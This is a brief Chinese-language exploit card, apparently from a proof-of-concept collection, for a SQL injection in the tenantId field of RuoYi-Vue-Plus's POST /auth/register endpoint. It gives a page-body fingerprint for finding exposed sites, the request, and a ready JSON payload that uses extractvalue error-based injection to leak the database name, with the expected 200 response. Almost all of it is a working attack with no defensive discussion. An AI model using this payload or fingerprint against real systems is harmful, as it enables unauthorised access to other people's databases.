# RuoYi若依Vue-Plustenant_id存在SQL注入漏洞

若依 ｜ SQL注入 ｜ —
- **指纹**：`body="欢迎使用RuoYi-Vue-Plus后台管理框架"`
- **请求**：`POST /auth/register HTTP/1.1`

**Payload**
```
"clientId": "e5cd7e4891bf95d1d19206ce24a7b32e",
"grantType": "password",
"tenantId": "1' AND extractvalue(1,concat(0x7e,(SELECT database()))) AND '1'='1",
"username": "admin",
"password": "admin"
}
```
- **响应特征**：200